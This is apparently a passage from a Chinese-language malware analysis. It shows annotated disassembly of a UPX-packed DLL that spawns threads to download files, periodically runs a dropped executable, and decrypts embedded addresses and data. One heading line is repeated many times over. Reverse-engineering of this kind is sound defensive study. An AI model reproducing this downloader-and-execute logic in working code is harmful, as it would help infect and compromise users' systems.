

```
UPX0:10003640                 call    CreateThread
UPX0:10003646
UPX0:10003646 loc_10003646:                           ; CODE XREF: sub_1000332A+305j
UPX0:10003646                 push    0FFFFFFFFh      ; dwMilliseconds
UPX0:10003648                 push    [ebp+hHandle]   ; hHandle
UPX0:1000364B                 call    WaitForSingleObject
UPX0:10003651                 cmp     dword_10008464, 0
UPX0:10003658                 jz      short loc_10003672
UPX0:1000365A                 push    0
UPX0:1000365C                 push    0
UPX0:1000365E                 push    offset aInternet ; "Internet"
UPX0:10003663                 push    offset sub_10005265 ; 不知道要干啥呢
UPX0:10003668                 push    0
UPX0:1000366A                 push    0
UPX0:1000366C                 call    CreateThread
UPX0:10003672
UPX0:10003672 loc_10003672:                           ; CODE XREF: sub_1000332A+24Dj
UPX0:10003672                                         ; sub_1000332A+25Aj ...
UPX0:10003672                 cmp     dword_10008468, 0
UPX0:10003679                 jz      short loc_100036A4
UPX0:1000367B                 push    1
UPX0:1000367D                 movzx   eax, word_10008450
UPX0:10003684                 push    eax
UPX0:10003685                 call    sub_1000116C    ; 和文件相关，下载文件啥的
UPX0:1000368A                 cmp     eax, 1
UPX0:1000368D                 jnz     short loc_100036A4
UPX0:1000368F                 push    0
UPX0:10003691                 push    0
UPX0:10003693                 push    0
UPX0:10003695                 push    offset sub_10005ACB ; 执行一个.exe文件
UPX0:1000369A                 push    0
UPX0:1000369C                 push    0
UPX0:1000369E                 call    CreateThread
UPX0:100036A4
UPX0:100036A4 loc_100036A4:                           ; CODE XREF: sub_1000332A+34Fj
UPX0:100036A4                                         ; sub_1000332A+363j
UPX0:100036A4                 cmp     dword_1000846C, 0
UPX0:100036AB                 jz      short loc_10003728
UPX0:100036AD                 lea     eax, [ebp+SystemTime]
UPX0:100036B3                 push    eax             ; lpSystemTime
UPX0:100036B4                 call    GetLocalTime
UPX0:100036BA
UPX0:100036BA loc_100036BA:                           ; CODE XREF: sub_1000332A+3FCj
UPX0:100036BA                 xor     eax, eax
UPX0:100036BC                 inc     eax
UPX0:100036BD                 jz      short loc_10003728
UPX0:100036BF                 lea     eax, [ebp+var_14C]
UPX0:100036C5                 push    eax             ; lpSystemTime
UPX0:100036C6                 call    GetLocalTime
UPX0:100036CC                 movzx   eax, [ebp+var_144]
UPX0:100036D3                 movzx   ecx, [ebp+SystemTime.wHour]
UPX0:100036DA                 sub     eax, ecx
UPX0:100036DC                 cmp     eax, dword_1000846C
UPX0:100036E2                 jl      short loc_1000371B
UPX0:100036E4                 mov     ax, [ebp+var_144]
UPX0:100036EB                 mov     [ebp+SystemTime.wHour], ax
UPX0:100036F2                 push    1
UPX0:100036F4                 movzx   eax, word_10008450
UPX0:100036FB                 push    eax
UPX0:100036FC                 call    sub_1000116C    ; 和文件相关，下载文件啥的
UPX0:10003701                 cmp     eax, 1
UPX0:10003704                 jnz     short loc_1000371B
UPX0:10003706                 push    0               ; lpThreadId
UPX0:10003708                 push    0
UPX0:1000370A                 push    0
UPX0:1000370C                 push    offset sub_10005ACB ; 执行一个。exe
UPX0:10003711                 push    0
UPX0:10003713                 push    0
UPX0:10003715                 call    CreateThread
UPX0:1000371B
UPX0:1000371B loc_1000371B:                           ; CODE XREF: sub_1000332A+3B8j
UPX0:1000371B                                         ; sub_1000332A+3DAj
UPX0:1000371B                 push    0EA60h          ; dwMilliseconds
UPX0:10003720                 call    Sleep
UPX0:10003726                 jmp     short loc_100036BA
UPX0:10003728 ; ---------------------------------------------------------------------------
UPX0:10003728
UPX0:10003728 loc_10003728:                           ; CODE XREF: sub_1000332A+381j
UPX0:10003728                                         ; sub_1000332A+393j ...
UPX0:10003728                 xor     eax, eax
UPX0:1000372A                 inc     eax
UPX0:1000372B                 jz      short loc_1000373A
UPX0:1000372D                 push    2710h           ; dwMilliseconds
UPX0:10003732                 call    Sleep
UPX0:10003738                 jmp     short loc_10003728
UPX0:1000373A ; ---------------------------------------------------------------------------
UPX0:1000373A
UPX0:1000373A loc_1000373A:                           ; CODE XREF: sub_1000332A+401j
UPX0:1000373A                 xor     eax, eax
UPX0:1000373C                 mov     ecx, [ebp+var_10]
UPX0:1000373F                 mov     large fs:0, ecx
UPX0:10003746                 pop     edi
UPX0:10003747                 pop     esi
UPX0:10003748                 pop     ebx
UPX0:10003749                 leave
UPX0:1000374A                 retn    4
UPX0:1000374A sub_1000332A    endp
```

代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：代码一：

程序开始创建一个互斥判断是否存在客户端，不存在就解密一些地址和一些数据

相关反汇编代码如下：

```
UPX0:1000374D ; void Encrypt(void)
UPX0:1000374D Encrypt         proc near               ; CODE XREF: sub_1000332A+63p
UPX0:1000374D var_6           = byte ptr -6
UPX0:1000374D var_5           = byte ptr -5
UPX0:1000374D var_4           = dword ptr -4
UPX0:1000374D hCrypto         = dword ptr  8
UPX0:1000374D fOAEP           = dword ptr  0Ch
UPX0:1000374D cbInData        = dword ptr  10h
UPX0:1000374D pInData         = dword ptr  14h
UPX0:1000374D pcbOutData      = dword ptr  18h
UPX0:1000374D ppOutData       = dword ptr  1Ch
UPX0:1000374D                 push    ebp
UPX0:1000374E                 mov     ebp, esp
UPX0:10003750                 push    ecx
UPX0:10003751                 push    ecx
UPX0:10003752                 and     dword ptr [ebp-4], 0
UPX0:10003756                 push    dword_10008480  ; dwMilliseconds
UPX0:1000375C                 call    Sleep
UPX0:10003762                 push    64              ; Size
UPX0:10003764                 push    0               ; Val
UPX0:10003766                 push    offset byte_10009430 ; Dst
UPX0:1000376B                 call    memset          ; 初始化全局变量byte_10009430
UPX0:10003770                 add     esp, 0Ch
UPX0:10003773                 push    256             ; Size
UPX0:10003778                 push    0               ; Val
UPX0:1000377A                 push    offset dword_10009228 ; Dst
UPX0:1000377F                 call    memset          ; 初始化全局变量dword_10009228
UPX0:10003784                 add     esp, 0Ch
UPX0:10003787                 mov     dword ptr [ebp-4], offset dword_10008488
UPX0:1000378E StartEncrypt:                           ; CODE XREF: Encrypt+76j
UPX0:1000378E                 mov     eax, [ebp-4]
UPX0:10003791                 movsx   eax, byte ptr [eax] ; 从EAX里面取出一字节扩展到EAX
UPX0:10003794                 test    eax, eax        ; 判断EAX是否为0
UPX0:10003796                 jz      short loc_100037C5 ; 等于0就跳
UPX0:10003798                 mov     eax, [ebp-4]    ; 再次取出EBP-4的内容放到EAX
UPX0:1000379B                 mov     al, [eax]       ; 取出以为放到AL里面
UPX0:1000379D                 mov     [ebp-5], al     ; AL的内容放到EBP-5里面去
UPX0:100037A0                 mov     al, [ebp-5]     ; 然后取出EBP-5的一字节放到AL里面去
UPX0:100037A3                 sub     al, 1           ; AL减去1
UPX0:100037A5                 mov     [ebp-5], al     ; AL放回EBP-5里面去
```
